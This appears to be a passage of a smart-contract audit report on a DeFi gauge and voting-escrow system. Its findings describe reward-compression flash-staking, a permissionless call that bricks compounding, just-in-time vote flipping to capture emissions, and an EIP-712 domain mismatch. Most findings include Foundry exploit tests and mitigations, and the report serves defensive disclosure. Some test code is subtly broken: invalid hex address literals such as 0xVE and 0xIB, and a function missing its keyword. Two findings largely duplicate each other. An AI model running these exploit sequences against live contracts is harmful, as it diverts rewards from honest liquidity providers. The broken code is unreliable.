      rewardRate = (rewardAmount + pendingRewards) / epochTimeRemaining;
      clPool.syncReward({ rewardRate: rewardRate, rewardReserve: totalRewardAmount + pendingRewards, periodFinish: epochEndTimestamp });
  }
  rewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] = rewardRate;
  ...
}

Because the stream is time-dependent, a late notify creates a highly timestamp-dependent spike that MEV can front-run (deposit) and back-run (withdraw) to extract most emissions.

## Impact
If GaugeManager executes notifyRewardAmount very late in the epoch (e.g., with seconds remaining), the entire epoch’s emission is compressed into that tiny window. A mempool watcher can deposit a high-liquidity CL NFT immediately after notify and withdraw right after the epoch flips, capturing the vast majority of that epoch’s rewards while being exposed for only that last second. Honest LPs present during the whole epoch get diluted because rewards were not streamed over the full epoch as intended. This requires the distribution call to occur late (an operational/keeper timing condition).

## Proof of Concept
Actors and preconditions:
- Only the GaugeManager (distribution) can call GaugeCL.notifyRewardAmount.
- Attacker monitors the mempool and can deposit/withdraw their CL NFT at will.

Attack steps:
1) Throughout an epoch, honest LPs have NFTs staked.
2) Near epoch end (e.g., t = epochNext(now) - 1), GaugeManager calls notifyRewardAmount(token, rewardAmount).
   - Because epochTimeRemaining is ~1 second, rewardRate becomes rewardAmount / 1s, compressing the whole epoch’s emissions into the last second.
3) Attacker immediately deposits a very large-liquidity CL NFT after the notify transaction (front-run/back-run in the same block or next tx).
4) One second later, when the epoch ends, the attacker withdraws and harvests.
5) Since the emission stream only existed in that last second, the attacker’s very large liquidity during that second captures nearly the entire epoch’s rewards, severely diluting the honest LPs who were staked all epoch.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {GaugeCL} from "contracts/CLGauge/GaugeCL.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {HybraTimeLibrary} from "contracts/libraries/HybraTimeLibrary.sol";
import {FixedPoint128} from "contracts/CLGauge/libraries/FixedPoint128.sol";

interface ICLPoolLike {
    function updateRewardsGrowthGlobal() external;
    function getRewardGrowthInside(int24,int24,uint256) external view returns (uint256);
    function stakedLiquidity() external view returns (uint256);
    function stake(int128, int24, int24, bool) external;
    function syncReward(uint256,uint256,uint256) external;
    function lastUpdated() external view returns (uint256);
    function rewardGrowthGlobalX128() external view returns (uint256);
    function rewardReserve() external view returns (uint256);
    function rollover() external view returns (uint256);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function collectFees() external;
    function gaugeFees() external view returns (uint256,uint256);
}

contract MockERC20 is IERC20 {
    string public name = "R"; string public symbol = "R"; uint8 public decimals = 18;
    mapping(address=>uint256) public override balanceOf;
    mapping(address=>mapping(address=>uint256)) public override allowance;
    uint256 public override totalSupply;
    function transfer(address to, uint256 amt) external override returns (bool){
        balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; emit Transfer(msg.sender,to,amt); return true;
    }
    function approve(address sp, uint256 amt) external override returns (bool){
        allowance[msg.sender][sp]=amt; emit Approval(msg.sender,sp,amt); return true;
    }
    function transferFrom(address f,address t,uint256 a) external override returns (bool){
        uint256 al=allowance[f][msg.sender]; if(al!=type(uint256).max) allowance[f][msg.sender]=al-a;
        balanceOf[f]-=a; balanceOf[t]+=a; emit Transfer(f,t,a); return true;
    }
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; totalSupply+=amt; emit Transfer(address(0),to,amt); }
}

contract MockFactory {
    mapping(bytes32=>address) public pools;
    function setPool(address token0,address token1,int24 spacing,address p) external {
        (address a,address b) = token0 < token1 ? (token0,token1) : (token1,token0);
        bytes32 k=keccak256(abi.encode(a,b,spacing)); pools[k]=p;
    }
    function getPool(address tokenA,address tokenB,int24 spacing) external view returns (address){
        (address a,address b) = tokenA < tokenB ? (tokenA,tokenB) : (tokenB,tokenA);
        return pools[keccak256(abi.encode(a,b,spacing))];
    }
}

contract MockCLPool is ICLPoolLike {
    uint256 public override lastUpdated;
    uint256 public override rewardGrowthGlobalX128;
    uint256 public override rewardReserve;
    uint256 public staked;
    uint256 public poolRewardRate;
    address public t0; address public t1;
    constructor(address _t0,address _t1){t0=_t0;t1=_t1;}
    function token0() external view override returns(address){return t0;}
    function token1() external view override returns(address){return t1;}
    function gaugeFees() external pure override returns(uint256,uint256){return (0,0);} 
    function collectFees() external override {}
    function rollover() external pure override returns (uint256){return 0;}
    function updateRewardsGrowthGlobal() external override {
        uint256 dt = block.timestamp - lastUpdated;
        if (dt>0 && rewardReserve>0 && staked>0 && poolRewardRate>0){
            uint256 r = poolRewardRate * dt;
            if (r > rewardReserve) r = rewardReserve;
            rewardGrowthGlobalX128 += (r * FixedPoint128.Q128) / staked;
            rewardReserve -= r;
        }
        lastUpdated = block.timestamp;
    }
    function getRewardGrowthInside(int24, int24, uint256 rgx) external view override returns (uint256){
        return rgx == 0 ? rewardGrowthGlobalX128 : rgx;
    }
    function stakedLiquidity() external view override returns (uint256){return staked;}
    function stake(int128 d, int24, int24, bool) external override { if (d>=0) staked += uint128(d); else staked -= uint128(-d); }
    function syncReward(uint256 rr,uint256 reserve,uint256) external override { poolRewardRate = rr; rewardReserve = reserve; lastUpdated = block.timestamp; }
}

interface INPM {
    function positions(uint256 tokenId) external view returns (
        uint96,address,address,address,int24,int24,int24,uint128,uint256,uint256,uint128,uint128);
    function collect((uint256,address,uint128,uint128) calldata) external returns (uint256,uint256);
    function safeTransferFrom(address from,address to,uint256 tokenId) external;
    function factory() external view returns (address);
}

contract MockNFPM is IERC721Receiver {
    struct P {address token0; address token1; int24 spacing; int24 lower; int24 upper; uint128 liq;}
    mapping(uint256=>P) public pos; mapping(uint256=>address) public ownerOf; address public fac;
    constructor(address _fac){fac=_fac;}
    function factory() external view returns (address){return fac;}
    function onERC721Received(address,address,uint256,bytes calldata) external pure override returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }
    function positions(uint256 id) external view returns (
        uint96,address,address,address,int24,int24,int24,uint128,uint256,uint256,uint128,uint128
    ){
        P memory p = pos[id];
        return (0,address(0),p.token0,p.token1,p.spacing,p.lower,p.upper,p.liq,0,0,0,0);
    }
    function collect((uint256,address,uint128,uint128) calldata) external pure returns (uint256,uint256){return (0,0);} 
    function safeTransferFrom(address from,address to,uint256 id) external {require(ownerOf[id]==from,"NA"); ownerOf[id]=to; IERC721Receiver(to).onERC721Received(msg.sender,from,id,"");}
    function mintPos(uint256 id,address token0,address token1,int24 spacing,int24 lower,int24 upper,uint128 liq,address owner) external {
        pos[id]=P(token0,token1,spacing,lower,upper,liq); ownerOf[id]=owner;
    }
}

contract MockRHYBR {
    address public token; mapping(address=>uint256) public received;
    constructor(address _token){token=_token;}
    function depostionEmissionsToken(uint256 amt) external { IERC20(token).transferFrom(msg.sender,address(this),amt); }
    function redeemFor(uint256 amt, uint8, address recipient) external { received[recipient] += amt; }
}

contract GaugeCL_EmissionCompressionTest is Test {
    MockERC20 reward;
    MockCLPool pool;
    MockFactory fac;
    MockNFPM nfpm;
    MockRHYBR rhybr;
    GaugeCL gauge;

    address distributor = address(0xD1);
    address lpVictim = address(0xBEEF);
    address lpAttacker = address(0xCAFE);
    address token0 = address(0x10);
    address token1 = address(0x11);

    function setUp() public {
        reward = new MockERC20();
        pool = new MockCLPool(token0, token1);
        fac = new MockFactory();
        nfpm = new MockNFPM(address(fac));
        rhybr = new MockRHYBR(address(reward));

        // map NFPM->Factory->Pool for (token0, token1, spacing=60)
        fac.setPool(token0, token1, 60, address(pool));

        // deploy gauge (unused params can be dummy)
        gauge = new GaugeCL(address(reward), address(rhybr), address(0xVE), address(address(pool)), distributor, address(0xIB), address(0xEB), true, address(nfpm), address(0xF));

        // fund distributor & approve gauge to pull rewards
        reward.mint(distributor, 1_000_000e18);
        vm.prank(distributor); reward.approve(address(gauge), type(uint256).max);

        // prepare victim & attacker NFTs
        nfpm.mintPos(1, token0, token1, 60, -60000, 60000, uint128(1e6), lpVictim);    // small liq
        nfpm.mintPos(2, token0, token1, 60, -60000, 60000, uint128(1e12), lpAttacker); // huge liq
    }

    function _epochStart(uint256 t) internal pure returns (uint256) { return t - (t % HybraTimeLibrary.WEEK); }

    function testLateNotifyEnablesFlashStakeCapture() public {
        // move to some epoch start + 100s
        vm.warp(1800 + 100);

        // victim deposits early in epoch
        vm.prank(lpVictim);
        gauge.deposit(1);

        // warp to last second of epoch
        uint256 nowTs = block.timestamp;
        uint256 epochEnd = _epochStart(nowTs) + HybraTimeLibrary.WEEK;
        vm.warp(epochEnd - 1);

        // DISTRIBUTION calls notify very late => ~1s remaining: compressed emission spike
        uint256 rewardAmount = 100_000e18;
        vm.prank(distributor);
        gauge.notifyRewardAmount(address(reward), rewardAmount);

        // attacker deposits huge-liquidity NFT immediately after notify
        vm.prank(lpAttacker);
        gauge.deposit(2);

        // one second passes to finish epoch
        vm.warp(epochEnd);

        // attacker withdraws and harvests
        vm.prank(lpAttacker);
        gauge.withdraw(2, 0);

        // victim withdraws and harvests
        vm.prank(lpVictim);
        gauge.withdraw(1, 0);

        uint256 atk = rhybr.received(lpAttacker);
        uint256 vic = rhybr.received(lpVictim);

        assertGt(atk, rewardAmount * 90 / 100, "attacker should steal >90% of epoch rewards");
        assertGt(atk, vic * 1000, "attacker gains orders of magnitude more than honest LP");
    }
}


## Suggested Mitigation
Harden notifyRewardAmount against late-epoch calls so rewards are never compressed into tiny windows:
- Enforce a call-time window: require(block.timestamp <= HybraTimeLibrary.epochStart(block.timestamp) + GRACE) for a small GRACE (e.g., 2–5 minutes). If called later, revert or roll the new reward to the next epoch.
- Alternatively, always stream over a full epoch regardless of call time: if epochTimeRemaining < MIN_REMAINING, set rate = rewardAmount / HybraTimeLibrary.WEEK and set periodFinish = HybraTimeLibrary.epochNext(block.timestamp) + HybraTimeLibrary.WEEK, so the newly provided reward is applied entirely to the next epoch.
- If mid-epoch top-ups are required, do not recompute rate off tiny timeRemaining; accumulate to a rollover bucket and keep the current epoch’s rate unchanged; only recalculate at the next epoch boundary.
Any of these prevent timestamp-dependent emission spikes exploitable by flash-stakers.





 **Derived From** : Anyone can force-compound HYBR into ve via unguarded receivePenaltyReward

## [M-16]. Permissionless receivePenaltyReward() lets anyone init veNFT and brick compound() via SafeERC20 approval invariant

## Derived From Pattern/Invariant
Anyone can force-compound HYBR into ve via unguarded receivePenaltyReward

## Exploit Type
AccessControl

## Location
GrowthHYBR.receivePenaltyReward

## Minimim Privilege Required
Permissionless

## Description
GrowthHYBR.receivePenaltyReward(uint256) is external with no auth and calls approve + deposit_for, and when veTokenId == 0 it calls _initializeVeNFT(amount), which sets an unlimited approval to VotingEscrow. This bypasses onlyOperator on compound() and lets any EOA force a lock extension and, critically, leave allowance at type(uint256).max. Because compound() uses SafeERC20.safeApprove (non-zero->non-zero reverts), a permissionless first-call to receivePenaltyReward() that initializes the veNFT leaves a non-zero allowance, causing future compound() calls to revert until an out-of-band allowance reset occurs. Vulnerable code:

function receivePenaltyReward(uint256 amount) external {
    if (amount > 0) {
        IERC20(HYBR).approve(votingEscrow, amount);
        if(veTokenId == 0){
            _initializeVeNFT(amount); // approve MAX then create_lock_for
        } else{
            IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);
            _extendLockToMax();
        }
    }
    penalty += amount;
}

_initalizeVeNFT(uint256 initialAmount) internal {
    IERC20(HYBR).approve(votingEscrow, type(uint256).max); // leaves infinite allowance
    veTokenId = IVotingEscrow(votingEscrow).create_lock_for(initialAmount, lockTime, address(this));
}


## Impact
Functional DoS on compounding: attacker can initialize veNFT and leave infinite allowance so later compound() reverts with SafeERC20 approve invariant. This prevents the operator from compounding HYBR into veHYBR until external state (allowance) is reset, disrupting auto-compounding schedule and yield.

## Proof of Concept
- Precondition: GrowthHYBR holds some HYBR and veTokenId == 0 (typical before first deposit), operator intends to compound after swaps.
- Attacker calls receivePenaltyReward(amount>0).
- _initializeVeNFT() executes and sets HYBR allowance to VotingEscrow = type(uint256).max; create_lock_for pulls initialAmount but does NOT decrease allowance (HYBR transferFrom skips decrement when allowance == max).
- Operator later calls compound(). It executes IERC20(HYBR).safeApprove(votingEscrow, hybrBalance) while current allowance != 0, so SafeERC20 reverts ("approve from non-zero to non-zero allowance").
- Compound is bricked until someone resets allowance (not possible in compound path), or a user deposit flow happens to set allowance to a finite value that gets consumed back to 0.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {GrowthHYBR} from "contracts/GovernanceHYBR.sol";
import {VotingEscrow} from "contracts/VotingEscrow.sol";
import {HYBR} from "contracts/HYBR.sol";

contract GrowthHYBR_AuthBypass_DoS_Test is Test {
    HYBR token;
    VotingEscrow ve;
    GrowthHYBR g;
    address attacker = address(0xBEEF);

    function setUp() public {
        token = new HYBR();
        ve = new VotingEscrow(address(token), address(0xDEAD));
        g = new GrowthHYBR(address(token), address(ve)); // operator = address(this)
        // fund GrowthHYBR with HYBR to simulate rewards/hard-funded balance
        token.mint(address(g), 100 ether);
    }

    function test_PermissionlessInit_BricksCompound() public {
        // Sanity: no veNFT yet
        assertEq(g.veTokenId(), 0);

        // Attacker permissionlessly initializes veNFT via receivePenaltyReward
        vm.prank(attacker);
        g.receivePenaltyReward(10 ether);

        // veNFT created and (due to _initializeVeNFT) allowance is left at max
        uint256 id = g.veTokenId();
        assertGt(id, 0);
        assertEq(token.allowance(address(g), address(ve)), type(uint256).max);

        // Operator tries to compound remaining HYBR -> reverts due to SafeERC20 approve non-zero->non-zero
        vm.expectRevert(); // "SafeERC20: approve from non-zero to non-zero allowance"
        g.compound();
    }
}


## Suggested Mitigation
- Gate receivePenaltyReward() with onlyOperator or a trusted sender (e.g., onlyRewardHYBR) so unauthorized EOAs cannot initialize/extend locks or alter approvals.
- In _initializeVeNFT avoid setting unlimited allowance, or immediately reset to 0 after create_lock_for; alternatively keep allowance at 0 and let subsequent flows use safeIncreaseAllowance/approve(0)->approve(amount).
- In compound(), proactively handle non-zero allowance by first setting to 0 before setting a new non-zero value (approve(0); approve(amount)) or switch to safeIncreaseAllowance.





 **Derived From** : Per-gauge epoch gating: After a successful distribution for gauge G at epochStart E, any further distribute calls in the same epoch do not change state (gaugesDistributionTimestmap[G] stays == E and base balance unchanged)

## [M-17]. Epoch-gated single-shot distribution is MEV: attacker front-runs distribute() and reweights votes to divert the whole epoch’s emissions

## Derived From Pattern/Invariant
Per-gauge epoch gating: After a successful distribution for gauge G at epochStart E, any further distribute calls in the same epoch do not change state (gaugesDistributionTimestmap[G] stays == E and base balance unchanged)

## Exploit Type
FrontrunMev

## Location
GaugeManager.distribute(address[])

## Minimim Privilege Required
Permissionless

## Description
GaugeManager settles emissions exactly once per gauge and epoch via lastTimestamp < epochStart. However, the amount sent in that single settlement is computed using the live weight at the time distribute() is called, not a snapshot frozen at the epoch boundary. Vulnerable flow: _updateForAfterDistribution() pulls the current IVoter(voter).weights(_pool) and accrues claimable[_gauge] = _supplied * (index - supplyIndex) / 1e18. Because distribution is a one-shot per epoch and permissionless, any ve voter (or a searcher cooperating with one) can 1) reweight their ve votes to a target gauge, then 2) immediately call distribute() to settle that gauge for the epoch using their temporary overweight, then 3) revert their votes afterward (subject to voter rules). This is a Temporal/Frontrun MEV on the epoch-gated settlement: whoever calls distribute decides which instantaneous weight is used for the entire epoch’s emission split. This drains other gauges’ fair share of the epoch’s emission without exceeding total emissions.

## Impact
Because GaugeManager._updateForAfterDistribution() reads IVoter(voter).weights(pool) live, the one permissionless distribute() call per gauge per epoch is settled using instantaneous weights rather than an epoch snapshot. Any voter can time their vote so that their target gauge is settled when its weight is temporarily maximized. This starves other gauges for that epoch and diverts the epoch’s emissions to the attacker’s preferred gauge up to the fraction of total voting power they control at settlement time. A majority voter can capture the entire epoch’s emission for a gauge. This is a real-value redistribution (emissions) and breaks the fair weighting intended for the epoch.

## Proof of Concept
Attack outline:
1) Attacker holds ve voting power and can cast/adjust their vote (within protocol rules, e.g., once per epoch).
2) Minter updates the period and funds GaugeManager (index increases for the epoch).
3) Before anyone calls distribute() for the target gauge, attacker sets their weight heavily/entirely to that gauge.
4) Attacker immediately calls GaugeManager.distribute([targetGauge]). _updateForAfterDistribution() uses the current overweight, computing claimable[targetGauge] = weight_now * (index - supplyIndex[targetGauge]) / 1e18.
5) GaugeManager transfers the claimable to the gauge. Attacker can later reset votes as allowed by the Voter.
Effect: The epoch’s emission share for that gauge is decided by the instantaneous weight at distribution time, not a snapshot, enabling frontrun/temporal MEV.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import "../contracts/GaugeManager.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("BASE","BASE") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockVE {
    address public immutable _token;
    constructor(address t){ _token = t; }
    function token() external view returns(address){ return _token; }
}

contract MockPermissionsRegistry {
    function hasRole(bytes memory, address) external pure returns(bool){ return true; }
    function hybraTeamMultisig() external view returns(address){ return address(this); }
}

contract MockTokenHandler {
    function isWhitelisted(address) external pure returns(bool){ return true; }
    function isConnector(address) external pure returns(bool){ return true; }
}

contract MockPairFactory { function isPair(address) external pure returns(bool){ return true; } }

contract MockPairInfo {
    address public t0; address public t1;
    constructor(address a,address b){ t0=a; t1=b; }
    function token0() external view returns(address){ return t0; }
    function token1() external view returns(address){ return t1; }
}

contract MockBribe { }
contract MockBribeFactory {
    function createBribe(address, address, address, string memory) external returns(address){ return address(new MockBribe()); }
}

contract SampleGauge {
    address public DISTRIBUTION;
    uint256 public received;
    constructor(address distribution){ DISTRIBUTION = distribution; }
    function emergency() external pure returns(bool){ return false; }
    function notifyRewardAmount(address token, uint amount) external {
        IERC20(token).transferFrom(DISTRIBUTION, address(this), amount);
        received += amount;
    }
}

contract MockGaugeFactory {
    function createGauge(address,address,address,address distribution,address,address,bool) external returns(address){
        return address(new SampleGauge(distribution));
    }
    function gauges(uint256) external pure returns(address){ return address(0); }
    function length() external pure returns(uint){ return 0; }
}

contract MockMinter {
    IERC20 public base;
    constructor(address _base){ base = IERC20(_base); }
    function update_period() external pure returns(uint256){ return 0; }
    function fundAndNotify(address gm, uint256 amt) external {
        base.approve(gm, amt);
        GaugeManager(gm).notifyRewardAmount(amt);
    }
}

contract MockVoter {
    uint256 public total;
    mapping(address=>uint256) public w;
    function setTotal(uint256 t) external { total = t; }
    function setWeight(address pool, uint256 weight) external { w[pool] = weight; }
    function totalWeight() external view returns(uint256){ return total; }
    function weights(address pool) external view returns(uint256){ return w[pool]; }
}

contract GaugeManagerTemporalMEVTest is Test {
    GaugeManager gm;
    MockERC20 base;
    MockVE ve;
    MockPermissionsRegistry reg;
    MockTokenHandler handler;
    MockGaugeFactory gf;
    MockPairFactory pf;
    MockBribeFactory bf;
    MockVoter voter;
    MockMinter minter;

    function setUp() public {
        base = new MockERC20();
        ve = new MockVE(address(base));
        reg = new MockPermissionsRegistry();
        handler = new MockTokenHandler();
        gf = new MockGaugeFactory();
        pf = new MockPairFactory();
        bf = new MockBribeFactory();
        voter = new MockVoter();
        gm = new GaugeManager();
        gm.initialize(address(ve), address(handler), address(gf), address(gf), address(pf), address(pf), address(reg), address(0xdead));
        gm.setBribeFactory(address(bf));
        gm.setVoter(address(voter));
        minter = new MockMinter(address(base));
        gm.setMinter(address(minter));
    }

    function test_FrontRunDistribute_UsesLiveWeights_CapturesEpochEmission() public {
        // create pool and gauge
        address t0 = address(new MockERC20());
        address t1 = address(new MockERC20());
        MockPairInfo pool = new MockPairInfo(t0, t1);
        (address gauge,,) = gm.createGauge(address(pool), 0);

        // Configure voter totals
        voter.setTotal(100);                // totalWeight = 100
        voter.setWeight(address(pool), 0);  // initially 0 to this pool

        // Fund minter and notify emission for the epoch
        base.mint(address(minter), 1_000 ether);
        vm.prank(address(minter));
        minter.fundAndNotify(address(gm), 1_000 ether);

        // Attacker reweights to their pool just-in-time
        voter.setWeight(address(pool), 100); // all weight to this pool now

        // Permissionless call settles one-shot for the epoch at this instantaneous weight
        address[] memory gs = new address[](1); gs[0] = gauge;
        gm.distribute(gs);

        // The whole emission for the epoch is diverted to this gauge
        uint256 got = SampleGauge(gauge).received();
        assertEq(got, 1_000 ether, "captured entire epoch emission by timing vote + distribute");
    }
}


## Suggested Mitigation
Eliminate reliance on live weights at distribution time. Options:
- Snapshot weights per pool at the epoch boundary and use those snapshots in _updateForAfterDistribution(). For example, in Voter, on each vote (or at epoch rollover) persist weightsPerEpoch[epochStart][pool]. Replace _supplied = IVoter(voter).weights(_pool) with _supplied = IVoter(voter).weightsAt(_pool, HybraTimeLibrary.epochStart(block.timestamp)).
- Alternatively, have Minter precompute and pass a per-gauge emission budget for the epoch (using a single weight snapshot) when calling GaugeManager (e.g., during update_period). GaugeManager then streams/distributes strictly from those frozen budgets.
- If snapshots in Voter are expensive to compute at rollover, enforce a vote-freeze window around epoch start and take a single snapshot once (e.g., during IMinter.update_period). GaugeManager should only use that snapshot for the entire epoch.
Any approach must ensure the single permissionless distribute() per epoch reads an immutable per-epoch weight, not a mutable live value.


## [H-18]. Epoch-gated single distribution samples live weights at call-time, enabling JIT vote flipping to siphon full epoch emissions

## Derived From Pattern/Invariant
Per-gauge epoch gating: After a successful distribution for gauge G at epochStart E, any further distribute calls in the same epoch do not change state (gaugesDistributionTimestmap[G] stays == E and base balance unchanged)

## Exploit Type
TimestampDependentLogic

## Location
GaugeManager._distribute(address)

## Minimim Privilege Required
Permissionless

## Description
GaugeManager._distribute() allows one successful distribution per epoch per gauge based on lastTimestamp < epochStart. However, the actual emission entitlement is computed right before that single distribution using the current weight from IVoter(voter).weights(_pool) rather than an epoch-snapshotted weight. This creates a time-of-measurement mismatch: a large ve holder can temporarily flip votes to a target gauge, then permissionlessly call distribute() for that gauge to capture the entire epoch’s emission share, regardless of how votes were allocated during the epoch or at notify time. Vulnerable flow: _updateForAfterDistribution reads live weights, multiplies by global delta index (set when minter notified), sets claimable, then distributes once per epoch. Because the per-gauge distribution can only happen once, the attacker’s chosen time instant determines the whole epoch allocation for that gauge, defeating epoch boundary consistency and fairness.

Vulnerable snippet:

function _distribute(address _gauge) internal {
  uint256 lastTimestamp = gaugesDistributionTimestmap[_gauge];
  uint256 currentTimestamp = HybraTimeLibrary.epochStart(block.timestamp);
  if (lastTimestamp < currentTimestamp){
    _updateForAfterDistribution(_gauge);
    uint256 _claimable = claimable[_gauge];
    if (_claimable > 0 && isAlive[_gauge] && !IGauge(_gauge).emergency()) {
      claimable[_gauge] = 0;
      gaugesDistributionTimestmap[_gauge] = currentTimestamp;
      IGauge(_gauge).notifyRewardAmount(base, _claimable);
    }
  }
}

function _updateForAfterDistribution(address _gauge) private {
  address _pool = poolForGauge[_gauge];
  uint256 _supplied = IVoter(voter).weights(_pool); // live weight at call-time
  ...
  uint256 _delta = _index - _supplyIndex;
  if (_delta > 0) {
    uint256 _share = _supplied * _delta / 1e18; // uses live weight, not epoch snapshot
    if (isAlive[_gauge]) claimable[_gauge] += _share;
  }
}

Impact: An attacker with ve power can time their vote flip and the single allowed distribution call to siphon a disproportionate share of the epoch’s emissions to their preferred gauge, reducing rewards for others. In extreme cases where weights at notify-time differ materially from weights at distribution-time, the mismatch can also strand part of emissions or misallocate them across gauges.

## Impact
An attacker (or any large ve voter) can flip votes and trigger the single allowed per-epoch distribution for a target gauge when its live weight is temporarily maximized. Because GaugeManager indexes by totalWeight at notify time but multiplies by live weights at distribution time, the attacker can redirect a disproportionate or even the entire epoch’s minted emissions to one gauge. This causes matured yield loss for other gauges’ LPs and can also strand emissions if gauges are distributed when their live weight is low or zero, leaving protocol funds stuck in the manager. The effect is systemic and repeatable every epoch.

## Proof of Concept
Attack steps (conceptual):
1) At epoch start (or when Minter notifies emissions), totalWeight T is sampled to set the global index. No per-gauge snapshot is stored.
2) Attacker shifts ve votes to gauge G so that IVoter.weights(poolForGauge[G]) is maximized at the moment of distribution.
3) Attacker calls GaugeManager.distribute([G]) once in the epoch. _updateForAfterDistribution reads the live weight w_G and calculates claimable = w_G * (index - supplyIndex[G]) / 1e18.
4) If w_G ≈ totalWeight (T), gauge G gets nearly 100% of the epoch’s emissions, regardless of how votes were allocated earlier in the epoch.
5) Other gauges, when (or if) distributed later with lower live weights, receive little to no emissions for the epoch. This violates epoch fairness and reallocates matured emissions.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeManager} from "ve33/contracts/GaugeManager.sol";
import {IERC20Upgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";

interface IVoterMock { function setTotal(uint v) external; function setWeight(address pool, uint w) external; }

contract MockERC20 is IERC20Upgradeable {
    string public name = "BASE"; string public symbol = "BASE"; uint8 public decimals = 18;
    mapping(address=>uint) public override balanceOf; mapping(address=>mapping(address=>uint)) public override allowance; uint public override totalSupply;
    function transfer(address to,uint v) external override returns(bool){ require(balanceOf[msg.sender]>=v,"bal"); balanceOf[msg.sender]-=v; balanceOf[to]+=v; return true; }
    function approve(address s,uint v) external override returns(bool){ allowance[msg.sender][s]=v; return true; }
    function transferFrom(address f,address t,uint v) external override returns(bool){ require(balanceOf[f]>=v && allowance[f][msg.sender]>=v,"allow"); allowance[f][msg.sender]-=v; balanceOf[f]-=v; balanceOf[t]+=v; return true; }
}

contract MockVE { address public token; constructor(address t){ token=t; } }

contract MockVoter is IVoterMock {
    uint public totalWeight; mapping(address=>uint) public weights;
    function setTotal(uint v) external { totalWeight=v; }
    function setWeight(address pool, uint w) external { weights[pool]=w; }
}

contract MockMinter { function update_period() external pure returns(uint256){ return 0; } }

contract MockGauge {
    bool public emergencyFlag = false; uint public received;
    function emergency() external view returns (bool) { return emergencyFlag; }
    function notifyRewardAmount(address token, uint amount) external {
        IERC20Upgradeable(token).transferFrom(msg.sender, address(this), amount);
        received += amount;
    }
}

contract GaugeManagerHarness is GaugeManager {
    function exposeInit(address __ve,address _th,address gf,address gfcl,address pf,address pfcl,address pr,address nfpm) external { initialize(__ve,_th,gf,gfcl,pf,pfcl,pr,nfpm); }
    function setM(address m) external { minter=m; }
    function setV(address v) external { voter=v; }
    function wireGauge(address pool, address gauge) external {
        gauges[pool]=gauge; poolForGauge[gauge]=pool; isGauge[gauge]=true; isAlive[gauge]=true; pools.push(pool);
    }
}

contract JITVoteHijackTest is Test {
    GaugeManagerHarness gm; MockERC20 base; MockVE ve; MockVoter voter; MockMinter minter; MockGauge gauge;
    address pool1 = address(0xBEEF);

    function setUp() public {
        base = new MockERC20();
        ve = new MockVE(address(base));
        voter = new MockVoter();
        minter = new MockMinter();
        gauge = new MockGauge();

        gm = new GaugeManagerHarness();
        gm.exposeInit(address(ve), address(0x1), address(0x2), address(0x3), address(0x4), address(0x5), address(0x6), address(0x7));
        gm.setM(address(minter));
        gm.setV(address(voter));
        gm.wireGauge(pool1, address(gauge));

        // Fund minter with BASE and approve GaugeManager
        uint amount = 1_000 ether; deal(address(base), address(minter), amount);
        vm.startPrank(address(minter)); base.approve(address(gm), amount); vm.stopPrank();

        // Emission notify this epoch: index += amount * 1e18 / totalWeight
        voter.setTotal(100);
        vm.prank(address(minter)); gm.notifyRewardAmount(amount);

        // Allow Gauge to pull from GaugeManager on distribution
        vm.prank(address(gm)); base.approve(address(gauge), type(uint).max);
    }

    function test_JITVoteFlip_CanSiphonFullEpochEmission() public {
        uint amount = base.balanceOf(address(gm)); // == 1_000 ether

        // Assume snapshot fairness would expect pool1=50/100 → ~50% share at notify
        // But we will flip just-in-time to 100 before the only distribution
        voter.setWeight(pool1, 100);

        address[] memory arr = new address[](1); arr[0]=address(gauge);
        gm.distribute(arr); // single per-epoch distribution uses live weight=100

        // Gauge received full epoch emission, not the ~50% expected under epoch snapshot
        assertEq(gauge.received(), amount, "gauge received not full amount");
        assertEq(base.balanceOf(address(gm)), 0, "manager should be empty after siphon");
    }
}


## Suggested Mitigation
Use epoch-snapshotted weights for per-gauge accruals. Two safe patterns:
- Snapshot-at-notify: When Minter calls GaugeManager.notifyRewardAmount, record weightsPerEpoch[epoch][pool] = IVoter.weights(pool) and totalWeightPerEpoch[epoch] = IVoter.totalWeight(). Then, in _updateForAfterDistribution, read _supplied from weightsPerEpoch[epochStart][pool] instead of the live weights. This makes the per-gauge share time-invariant within the epoch.
- Push per-gauge deltas at notify: At notify time, compute each gauge’s per-epoch share using the snapshot and increment claimable directly (or maintain a per-gauge index keyed by epoch). Distribute() then only transfers precomputed claimable, independent of later vote changes.
Additionally, ensure any undistributed or mismatched amounts cannot remain stranded in GaugeManager: either fully assign at notify or sweep residuals back to the Minter at epoch end.





 **Derived From** : EIP-712 domain encoding mismatch in delegateBySig (non-standard; signature breakage)

## [M-19]. VotingEscrow.delegateBySig uses non-standard EIP-712 domain (adds version not in typehash), breaking signature verification

## Derived From Pattern/Invariant
EIP-712 domain encoding mismatch in delegateBySig (non-standard; signature breakage)

## Exploit Type
StandardViolation

## Location
VotingEscrow.delegateBySig

## Minimim Privilege Required
Permissionless

## Description
delegateBySig computes the EIP-712 domain separator with an extra `version` field while DOMAIN_TYPEHASH excludes it. This violates EIP-712 and causes signatures produced by standard tooling (which use the declared type) to fail on-chain, effectively DoSing meta-delegation. Vulnerable code:

bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");
...
bytes32 domainSeparator = keccak256(
    abi.encode(
        DOMAIN_TYPEHASH,
        keccak256(bytes(name)),
        keccak256(bytes(version)),   // extra field not present in typehash
        block.chainid,
        address(this)
    )
);

Because the typehash omits `string version` but encoding includes it, any signature created with standard EIP-712 signers (which follow the declared domain type) will not verify, reverting and preventing off-chain signature-based delegation.
